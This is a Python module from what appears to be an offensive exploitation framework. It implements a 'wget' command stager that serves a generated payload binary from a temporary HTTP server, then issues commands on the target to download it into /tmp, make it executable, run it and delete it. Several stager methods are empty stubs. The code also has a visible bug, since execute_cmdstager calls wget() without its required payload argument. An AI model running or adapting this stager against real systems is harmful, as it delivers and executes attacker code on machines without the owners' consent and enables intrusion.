from core.utils.printer import *
from lib.compile.exe import Exe
from core.base.option import OptString
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import threading

class HttpServer(HTTPServer):
    def serve_forever(self, content):
        self.stop = False
        self.content = content
        while not self.stop:
            self.handle_request()

class HttpRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        self.wfile.write(self.server.content)
        self.server.stop = True

    def log_message(self, format, *args):
        return

class Cmdstager(Exe):

    cmdstager = OptString("wget", "The cmd stager to user", "yes", True)
    cmdstager_temp = OptString("/tmp", "Writable directory for staged files", "no", True)


    def wget(self, payload):

        if self.cmdstager_temp == "/":
            self.cmdstager_temp = ""

        payload_arch = self._current_payload._Module__info__['arch']
        payload_platform = self._current_payload._Module__info__['platform']

        print_status("Using wget method")
        payload = self.generate_payload(payload_arch, payload, payload_platform)
        if not payload:
            print_error("Platform not supported for compilation")
            return
        binary_name = self.random_text(10)

        try:
            server = HttpServer(("0.0.0.0", int(8000)), HttpRequestHandler)
        except socket.error:
            print_error("Could not set up HTTP Server on 0.0.0.0:8000")
            return False

        thread = threading.Thread(target=server.serve_forever, args=(payload,))
        thread.start()

        print_status(f"Using wget to download binary: {binary_name}")
        cmd = f"wget http://0.0.0.0:8000/{binary_name} -qO {self.cmdstager_temp}/{binary_name}"
        print_status("Send: ",cmd)
        return cmd, f"{self.cmdstager_temp}/{binary_name}"

    def wget_decode(self, name):
        cmds = []
        cmds.append(f"chmod +x {name}")
        cmds.append(name)
        cmds.append(f"rm -f {name}")
        return cmds 

    def echo(self):
        pass
    
    def printf(self):
        pass
    
    def certutil(self):
        pass

    def execute_command(self, cmd, opts={}):
        raise NotImplementedError("You have to define your own 'execute_command' method.")

    def execute_cmdstager(self):
        if "cmdstager" in self._Module__info['payload'].keys():
            if self._Module__info['payload']['cmdstager'] in ["wget", "echo", "printf", "certutil"]:
                if self.cmdstager == "wget":
                    cmds = []
                    binary_cmd, binary_path = self.wget()
                    cmds.append(binary_cmd)
                    cmds.extend(self.wget_decode(binary_path))
                    for cmd in cmds:
                        self.execute_command(cmd)
                        
                elif self._Module__info['payload']['cmdstager'] == "echo":
                    pass
                
                elif self._Module__info['payload']['cmdstager'] == "printf":
                    pass